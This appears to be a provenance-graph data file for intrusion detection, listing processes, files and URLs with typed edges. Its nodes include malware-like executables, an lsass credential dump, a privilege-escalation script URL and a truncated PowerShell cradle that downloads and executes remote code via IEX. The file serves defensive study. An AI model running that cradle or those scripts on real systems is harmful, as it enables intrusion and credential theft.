61
MP-MicrosoftEdgeUpdate.exe
SF-C:\Users\admin\AppData\Local\Temp\is-I2CKA.tmp
TP-vlc.exe 
TF-C:\Users\admin\AppData\Local\Temp\444444.png
TP-k2141323.exe
MF-C:\Users\admin\AppData\Local\Temp\468C
MF-96.zip
MP-444444.png.png.exe 
MP-MMFbbhOyNS.exe
TP-tshark.exe
MF-\Windows\debug\WIA\wininit.exe
TP-net1.exe
SO-file://C:\windows\system32\notepad.exe
MP-7za.exe
MF-C:\Windows\Temp\lsass_dump.dmp
TF-C:\Users\admin\AppData\Local\Temp\reviewref_protected
SF-C:\Users\admin\AppData\Local\Temp\putty
MF-\windows\system32\calc.exe
MF-.\T1218.007\bin\T1218.007_DLL.m
SO-127.0.0.1
TP-goose_goose_duck_free.exe 
SO-https://gmail.us21.list-manage.com/track/click?u=c5edbce8886c368c0f6288564&id=20a3994999&e=e4fa9352f9
TP*-DllHost.exe 
MP-pestudio.exe 
MP-sdiagnhost.exe
TP-Redline Activate.exe 
MP*-X_Net_Windows.exe
TF-\Windows\System32\rundll32.exe
SO-https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1
MF-files\29630.ico
MP-IrSatorLauncher.exe 
MF-EXa1276.12704\MadInjector\MadInjector.exe
TP*-fast1nject.exe 
MP-DIXRAT.exe 
TP-certreq.exe
MP*-qwinsta.exe
TP-n4054738.exe
TF-C:\Users\admin\AppData\Local\Temp\b
MF-\Users\admin\AppData\Local\Temp\skmt-bankinter-003-03588993232059560257100458.jar
MP-cmd.exe 
TP-Scanned_file_PO23_Jan.exe 
MF-\Windows\system32\shell32.dll
MF-files\8527.ico.txt
SO-https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt
TP-RdrCEF.exe
TP-some_malicious_file.bin.exe
TP-server.exe 
MP-svchost.exe
TP-rundll32.exe
TP-SecuriteInfo.com
MP-LZ4-SOFT.exe 
MF-PathToAtomicsFolder\T1546.003\src\T1546.003.m
SO-http://fbi.fund/dark.exe
SF-C:\Users\admin\AppData\Local\Temp\nsf91FB
SO-https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_
MF-\Users\admin\AppData\Local\Temp\Saz_Injector.zip
MP-Invoice.exe 
SF-C:\Users\admin\Desktop\Attachment_94259849.zip
SF-C:\Program Files\Microsoft Office\Office14\ONENOTE
SO-hxxp://avirona.ru/7-ZIP.html
MP-Windows Defender Protection.exe
182
0 1 CD-1
0 2 FR-1
2 1 WR-1
0 3 WR-1
2 3 RD-1
0 4 FR-1
4 1 EX-1
2 4 IJ-1
4 3 WR-1
2 5 UK-1
4 6 WR-1
7 1 UK-1
8 3 WR-1
4 8 IJ-1
8 6 EX-1
9 3 RD-1
4 9 UK-1
8 10 RD-1
11 3 WR-1
11 6 WR-1
8 11 IJ-1
11 10 UK-1
12 8 RF-1
13 6 WR-1
12 13 RF-1
8 14 WR-1
13 14 WR-1
8 15 CD-1
13 15 WR-1
8 16 WR-1
13 16 RD-1
8 17 RD-1
13 17 RD-1
8 18 WR-1
13 18 WR-1
13 19 ST-1
12 20 RF-1
13 20 IJ-1
20 14 WR-1
20 15 RD-1
20 16 EX-1
20 17 RD-1
20 18 RD-1
19 20 RF-1
13 21 ST-1
21 20 RF-1
22 12 ST-1
13 22 IJ-1
22 14 WR-1
22 15 RD-1
22 16 RD-1
22 17 RD-1
22 18 WR-1
22 19 ST-1
20 22 IJ-1
22 21 ST-1
13 23 FR-1
23 14 WR-1
23 15 CD-1
23 16 RD-1
23 17 WR-1
23 18 WR-1
23 19 ST-1
20 23 UK-1
24 14 WR-1
24 15 EX-1
24 16 WR-1
24 17 WR-1
24 18 RD-1
19 24 RF-1
24 21 ST-1
22 24 IJ-1
25 15 WR-1
25 16 WR-1
25 17 EX-1
25 18 WR-1
25 19 ST-1
21 25 RF-1
22 25 IJ-1
24 25 UK-1
26 16 WR-2
26 17 CD-2
26 18 WR-2
19 26 RF-1
26 21 ST-2
22 26 IJ-1
22 27 WR-1
26 27 RD-2
28 22 RF-1
28 26 RF-2
22 29 RD-1
26 29 WR-2
21 30 RF-1
22 30 UK-1
26 31 WR-2
26 32 IJ-2
32 27 CD-3
32 28 ST-3
32 29 WR-3
32 31 WR-3
26 33 FR-2
33 27 WR-3
28 33 RF-3
33 29 CD-3
33 31 RD-3
32 33 IJ-3
26 34 FR-2
34 27 WR-3
28 34 RF-3
34 29 UK-3
26 35 FR-2
35 27 WR-4
35 28 ST-4
35 31 CD-4
32 35 IJ-3
36 27 RD-4
36 28 ST-4
36 31 RD-4
32 36 IJ-3
33 36 UK-3
32 37 WR-3
35 37 WR-4
32 38 WR-3
35 38 EX-4
39 31 WR-4
32 39 IJ-3
39 37 RD-4
39 38 WR-4
40 31 WR-4
32 40 IJ-3
35 40 IJ-4
40 37 EX-4
40 38 WR-4
39 40 UK-4
32 41 EX-3
35 41 EX-4
35 42 RD-4
43 35 RF-4
35 44 FR-4
